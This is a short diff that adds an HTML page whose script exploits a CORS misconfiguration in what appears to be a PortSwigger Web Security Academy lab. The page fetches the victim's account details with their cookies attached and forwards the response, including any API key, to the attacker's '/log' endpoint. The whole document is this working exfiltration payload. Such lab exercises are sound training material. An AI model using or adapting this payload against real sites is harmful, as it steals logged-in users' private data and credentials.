@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var url = "https://YOUR-LAB-ID.web-security-academy.net/accountDetails";
+
+            fetch(url, { credentials: 'include' })
+                .then(response => response.text())
+                .then(data => fetch("/log?key=" + encodeURIComponent(data)))
+                .catch(error => console.error('Error:', error));
+        </script>
+    </body>
+</html>
